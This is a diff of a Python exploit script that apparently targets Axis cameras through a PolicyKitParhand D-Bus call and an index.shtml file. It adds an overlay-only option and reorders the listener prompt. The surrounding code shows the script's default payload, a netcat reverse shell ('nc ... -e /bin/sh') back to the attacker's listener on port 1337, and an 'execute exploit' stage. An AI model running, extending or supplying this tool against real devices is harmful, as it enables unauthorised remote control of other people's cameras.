@@ -29,6 +29,7 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-a", "--auto", action="store_true", help="Auto mode (do not prompt for listener)")
 parser.add_argument("-c", "--command", type=str, help="Command to run (default: 'nc [LISTEN] [LISTEN_PORT] -e /bin/sh')")
 parser.add_argument("-f", "--file", type=str, help="Target file path (default: index.shtml)")
+parser.add_argument("-i", "--overlay-only", action="store_true", help="Only modify image overlay text and exit")
 parser.add_argument("-l", "--listen", type=str, help="Listener IP (default: response from http://checkip.amazonaws.com)")
 parser.add_argument("-lp", "--listen-port", type=int, help="Listener port (default: 1337)")
 parser.add_argument("-o", "--overlay", type=str, help="Image overlay text (optional)")
@@ -152,7 +153,7 @@ def sync_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters",
     }
     
-    logging(f"Syncing parameters...\t\t\t\t\t")
+    logging(f"Syncing parameters...\t\t\t\t\t\t")
     
     if http_check(requests.post(f"{target_url}", data=SYNC_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
@@ -213,14 +214,17 @@ def main():
         exit(0)
   
     logging("+ Preparing to execute exploit.\n")
-    
-    if not args.quiet:
-        if not args.auto:
-            input("= Start listener and press Enter to continue...")
-    
+      
     if (overlay_text != ""):
         overlay_req()
         sync_req()
+
+    if (args.overlay_only):
+        exit(0)
+
+    if not args.quiet:
+        if not args.auto:
+            input("= Start listener and press Enter to continue...")
     
     command_reset_req()
     sync_req()
